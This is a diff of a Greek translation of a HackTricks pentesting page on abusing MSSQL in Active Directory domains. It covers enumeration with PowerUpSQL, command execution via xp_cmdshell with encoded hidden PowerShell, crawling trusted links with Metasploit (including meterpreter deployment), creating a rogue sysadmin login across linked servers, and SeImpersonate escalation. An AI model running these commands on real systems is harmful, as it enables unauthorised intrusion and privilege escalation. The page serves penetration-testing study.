@@ -1,34 +1,24 @@
-# Κατάχρηση MSSQL AD
+# Κατάχρηση του MSSQL στο AD
 
 <details>
 
-<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Red Team του HackTricks στο AWS)</strong></a><strong>!</strong></summary>
 
-* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
+* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε τη **εταιρεία σας διαφημισμένη στο HackTricks**; ή θέλετε να έχετε πρόσβαση στη **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
 * Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Συμμετάσχετε** στην [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Εγγραφείτε στη** [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγράφου**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
 
 ## **Απαρίθμηση / Ανακάλυψη MSSQL**
 
-Το powershell module [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) είναι πολύ χρήσιμο σε αυτήν την περίπτωση.
+Το πρόσθετο powershell [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) είναι πολύ χρήσιμο σε αυτήν την περίπτωση.
 ```powershell
 Import-Module .\PowerupSQL.psd1
 ```
 ### Απαρίθμηση από το δίκτυο χωρίς συνεδρία τομέα
-
-Για να πραγματοποιήσουμε απαρίθμηση από το δίκτυο χωρίς συνεδρία τομέα, μπορούμε να ακολουθήσουμε τα παρακάτω βήματα:
-
-1. Χρησιμοποιούμε το εργαλείο `nmap` για να εντοπίσουμε τους διαθέσιμους υπολογιστές στο δίκτυο.
-2. Εκτελούμε την εντολή `nmap -p 1433 --open -sV <IP>` για να ελέγξουμε αν οι υπολογιστές αποκρίνονται στη θύρα 1433, η οποία είναι η προεπιλεγμένη θύρα για το Microsoft SQL Server.
-3. Αν εντοπίσουμε υπολογιστές που αποκρίνονται, χρησιμοποιούμε το εργαλείο `mssql-cli` για να συνδεθούμε στον SQL Server.
-4. Εκτελούμε ερωτήματα SQL για να αποκτήσουμε πληροφορίες για τη βάση δεδομένων, τους πίνακες και τα δεδομένα που περιέχονται σε αυτήν.
-5. Αναλύουμε τα αποτελέσματα για να εντοπίσουμε ευπάθειες ή πιθανές ευκαιρίες για εκμετάλλευση.
-
-Με αυτόν τον τρόπο, μπορούμε να πραγματοποιήσουμε απαρίθμηση από το δίκτυο χωρίς να απαιτείται συνεδρία τομέα.
 ```powershell
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -43,20 +33,6 @@ Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads
 Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
 ```
 ### Απαρίθμηση από μέσα στον τομέα
-
-Για να απαριθμήσουμε τον τομέα από μέσα, μπορούμε να χρησιμοποιήσουμε τις παρακάτω τεχνικές:
-
-1. **Ανάλυση DNS**: Ελέγξτε τις καταχωρήσεις DNS για να ανακτήσετε πληροφορίες για τον τομέα, όπως τα ονόματα των υπηρεσιών και των υπολογιστών.
-
-2. **Ανάλυση LDAP**: Χρησιμοποιήστε το πρωτόκολλο LDAP για να ανακτήσετε πληροφορίες για τους χρήστες, τις ομάδες και τις μονάδες οργάνωσης του τομέα.
-
-3. **Ανάλυση SMB**: Ελέγξτε το πρωτόκολλο SMB για να ανακτήσετε πληροφορίες για τους κοινόχρηστους φακέλους, τις εκτυπωτές και τις ρυθμίσεις ασφαλείας του τομέα.
-
-4. **Ανάλυση MSSQL**: Εκτελέστε ερωτήματα SQL στη βάση δεδομένων MSSQL για να ανακτήσετε πληροφορίες για τους πίνακες, τις αποθηκευμένες διαδικασίες και τα δικαιώματα πρόσβασης.
-
-5. **Ανάλυση Kerberos**: Ελέγξτε το πρωτόκολλο Kerberos για να ανακτήσετε πληροφορίες για τους χρήστες, τις υπηρεσίες και τα εισιτήρια αυθεντικοποίησης του τομέα.
-
-Αυτές οι τεχνικές μπορούν να σας βοηθήσουν να αποκτήσετε πληροφορίες για τον τομέα από μέσα, προκειμένου να εντοπίσετε ευπάθειες και να προχωρήσετε σε περαιτέρω επιθέσεις.
 ```powershell
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -75,36 +51,9 @@ Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 # Get DBs, test connections and get info in oneliner
 Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
 ```
-## Βασική Κατάχρηση του MSSQL
+## Βασική Κατάχρηση MSSQL
 
-### Πρόσβαση στη Βάση Δεδομένων
-
-Για να αποκτήσουμε πρόσβαση σε μια βάση δεδομένων MSSQL, μπορούμε να ακολουθήσουμε τα παρακάτω βήματα:
-
-1. Ελέγξτε αν έχετε πρόσβαση στον SQL Server.
-2. Χρησιμοποιήστε το εργαλείο `sqlcmd` για να συνδεθείτε στον SQL Server.
-3. Εκτελέστε εντολές SQL για να αποκτήσετε πρόσβαση στη βάση δεδομένων.
-
-Παρακάτω παρατίθενται παραδείγματα εντολών SQL που μπορείτε να χρησιμοποιήσετε:
-
-```sql
--- Σύνδεση στον SQL Server
-sqlcmd -S <server> -U <username> -P <password>
-
--- Εμφάνιση όλων των βάσεων δεδομένων
-SELECT name FROM sys.databases;
-
--- Επιλογή μιας συγκεκριμένης βάσης δεδομένων
-USE <database_name>;
-
--- Εμφάνιση όλων των πινάκων στη βάση δεδομένων
-SELECT name FROM sys.tables;
-
--- Εκτέλεση μιας εντολής SQL
-EXEC sp_executesql N'<sql_command>';
-```
-
-Ακολουθώντας αυτά τα βήματα, μπορείτε να αποκτήσετε πρόσβαση σε μια βάση δεδομένων MSSQL και να εκτελέσετε εντολές SQL για να ανακτήσετε πληροφορίες ή να πραγματοποιήσετε αλλαγές.
+### Πρόσβαση στη ΒΔ
 ```powershell
 #Perform a SQL query
 Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"
@@ -118,24 +67,22 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ```
 ### MSSQL RCE
 
-Είναι επίσης πιθανό να εκτελέσετε εντολές μέσα στον κεντρικό υπολογιστή MSSQL.
+Είναι επίσης πιθανό να **εκτελέσετε εντολές** μέσα στον κεντρικό διακομιστή MSSQL
 ```powershell
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
-Ελέγξτε στη σελίδα που αναφέρεται στο **επόμενο τμήμα πώς να το κάνετε χειροκίνητα**.
-
-### Βασικά Κόλπα Χάκινγκ στο MSSQL
+### Βασικά Κόλπα Χάκερικής για το MSSQL
 
 {% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
 [pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
 {% endcontent-ref %}
 
-## Εμπιστευμένοι Συνδέσμοι MSSQL
+## Εμπιστευμένοι Σύνδεσμοι MSSQL
 
-Εάν ένα παράδειγμα MSSQL είναι εμπιστευμένο (σύνδεση βάσης δεδομένων) από ένα διαφορετικό παράδειγμα MSSQL. Εάν ο χρήστης έχει δικαιώματα στην εμπιστευμένη βάση δεδομένων, θα μπορεί να **χρησιμοποιήσει τη σχέση εμπιστοσύνης για να εκτελέσει ερωτήματα και στο άλλο παράδειγμα**. Αυτές οι εμπιστοσύνες μπορούν να αλυσοδεθούν και σε κάποιο σημείο ο χρήστης μπορεί να βρει μια κακοδιαμορφωμένη βάση δεδομένων όπου μπορεί να εκτελέσει εντολές.
+Εάν ένα παράδειγμα MSSQL είναι εμπιστευμένο (σύνδεσμος βάσης δεδομένων) από ένα διαφορετικό παράδειγμα MSSQL. Εάν ο χρήστης έχει προνόμια στην εμπιστευμένη βάση δεδομένων, θα μπορεί να **χρησιμοποιήσει τη σχέση εμπιστοσύνης για να εκτελέσει ερωτήματα και στο άλλο παράδειγμα**. Αυτές οι εμπιστοσύνες μπορούν να αλυσιδωθούν και σε κάποιο σημείο ο χρήστης ενδέχεται να βρει μια κακοδιαμορφωμένη βάση δεδομένων όπου μπορεί να εκτελέσει εντολές.
 
-**Οι συνδέσεις μεταξύ βάσεων δεδομένων λειτουργούν ακόμα και μεταξύ εμπιστευμένων δασών.**
+**Οι σύνδεσμοι μεταξύ βάσεων δεδομένων λειτουργούν ακόμα και σε εμπιστοσύνες δάση.**
 
 ### Κατάχρηση Powershell
 ```powershell
@@ -171,27 +118,26 @@ Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql
 ```
 ### Metasploit
 
-Μπορείτε εύκολα να ελέγξετε για αξιόπιστους συνδέσμους χρησιμοποιώντας το metasploit.
+Μπορείτε εύκολα να ελέγξετε τους αξιόπιστους συνδέσμους χρησιμοποιώντας το metasploit.
 ```bash
 #Set username, password, windows auth (if using AD), IP...
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
-Παρατηρήστε ότι το metasploit θα προσπαθήσει να καταχραστεί μόνο την λειτουργία `openquery()` στο MSSQL (επομένως, αν δεν μπορείτε να εκτελέσετε εντολές με την `openquery()`, θα πρέπει να δοκιμάσετε τη μέθοδο `EXECUTE` **χειροκίνητα** για να εκτελέσετε εντολές, δείτε περισσότερα παρακάτω.)
+### Μη αυτόματο - Openquery()
 
-### Χειροκίνητο - Openquery()
+Από το **Linux** μπορείτε να αποκτήσετε ένα κέλυφος κονσόλας MSSQL με τα **sqsh** και **mssqlclient.py.**
 
-Από **Linux** μπορείτε να αποκτήσετε ένα κέλυφος κονσόλας MSSQL με τα εργαλεία **sqsh** και **mssqlclient.py.**
-
-Από **Windows** μπορείτε επίσης να βρείτε τους συνδέσμους και να εκτελέσετε εντολές χειροκίνητα χρησιμοποιώντας έναν **πελάτη MSSQL όπως** [**HeidiSQL**](https://www.heidisql.com)
+Από τα **Windows** μπορείτε επίσης να βρείτε τους συνδέσμους και να εκτελέσετε εντολές χειροκίνητα χρησιμοποιώντας έναν **πελάτη MSSQL όπως το** [**HeidiSQL**](https://www.heidisql.com)
 
 _Σύνδεση χρησιμοποιώντας ταυτοποίηση Windows:_
 
-![](<../../.gitbook/assets/image (167) (1).png>)
+![](<../../.gitbook/assets/image (167) (1).png>) 
 
-#### Εύρεση αξιόπιστων συνδέσμων
+#### Εύρεση Αξιόπιστων Συνδέσμων
 ```sql
-select * from master..sysservers
+select * from master..sysservers;
+EXEC sp_linkedservers;
 ```
 ![](<../../.gitbook/assets/image (168).png>)
 
@@ -202,12 +148,12 @@ select * from master..sysservers
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
 {% hint style="warning" %}
-Ελέγξτε πού χρησιμοποιούνται διπλά και μονά εισαγωγικά, είναι σημαντικό να τα χρησιμοποιείτε με αυτόν τον τρόπο.
+Ελέγξτε πού χρησιμοποιούνται τα διπλά και μονά εισαγωγικά, είναι σημαντικό να χρησιμοποιούνται με αυτόν τον τρόπο.
 {% endhint %}
 
 ![](<../../.gitbook/assets/image (169).png>)
 
-Μπορείτε να συνεχίσετε αυτήν την αλυσίδα αξιόπιστων συνδέσμων για πάντα με το χέρι.
+Μπορείτε να συνεχίσετε αυτήν την αλυσίδα αξιόπιστων συνδέσεων επ' αόριστον χειροκίνητα.
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
@@ -215,32 +161,18 @@ SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''p
 # Second level RCE
 SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
 ```
-Εάν δεν μπορείτε να εκτελέσετε ενέργειες όπως `exec xp_cmdshell` από το `openquery()`, δοκιμάστε με τη μέθοδο `EXECUTE`.
-
 ### Εγχειρίδιο - EXECUTE
 
-Μπορείτε επίσης να καταχραστείτε τους αξιόπιστους συνδέσμους χρησιμοποιώντας τη μέθοδο `EXECUTE`:
+Μπορείτε επίσης να καταχραστείτε τα αξιόπιστα συνδέσμους χρησιμοποιώντας τη μέθοδο `EXECUTE`:
 ```bash
 #Create user and give admin privileges
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 ```
-## Ανέλιξη Τοπικών Προνομιών
+## Ανόρθωση Προνομίων Τοπικού Χρήστη
 
-Ο τοπικός χρήστης **MSSQL** συνήθως έχει έναν ειδικό τύπο προνομίου που ονομάζεται **`SeImpersonatePrivilege`**. Αυτό επιτρέπει στον λογαριασμό να "υποκαταστήσει έναν πελάτη μετά την πιστοποίηση".
+Ο **τοπικός χρήστης MSSQL** συνήθως έχει ένα ειδικό είδος προνομίου που ονομάζεται **`SeImpersonatePrivilege`**. Αυτό επιτρέπει στον λογαριασμό να "υποκαταστήσει έναν πελάτη μετά την πιστοποίηση".
 
-Μια στρατηγική που πολλοί συγγραφείς έχουν αναπτύξει είναι να αναγκάσουν έναν υπηρεσία του συστήματος να πιστοποιηθεί σε μια ψεύτικη ή man-in-the-middle υπηρεσία που δημιουργεί ο επιτιθέμενος. Αυτή η ψεύτικη υπηρεσία μπορεί στη συνέχεια να υποκαταστήσει την υπηρεσία του συστήματος ενώ προσπαθεί να πιστοποιηθεί.
+Μια στρατηγική που πολλοί συγγραφείς έχουν σκεφτεί είναι να αναγκάσουν ένα υπηρεσία SYSTEM να πιστοποιηθεί σε μια ψεύτικη ή man-in-the-middle υπηρεσία που δημιουργεί ο επιτιθέμενος. Αυτή η ψεύτικη υπηρεσία είναι σε θέση να υποκαταστήσει την υπηρεσία SYSTEM ενώ προσπαθεί να πιστοποιηθεί.
 
-Το [SweetPotato](https://github.com/CCob/SweetPotato) περιλαμβάνει μια συλλογή από αυτές τις διάφορες τεχνικές που μπορούν να εκτελεστούν μέσω της εντολής `execute-assembly` του Beacon.
-
-<details>
-
-<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
-
-* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
-* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Συμμετάσχετε** στην [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
-
-</details>
+Το [SweetPotato](https://github.com/CCob/SweetPotato) διαθέτει μια συλλογή αυτών των διαφόρων τεχνικών που μπορούν να εκτελεστούν μέσω της εντολής `execute-assembly` του Beacon.
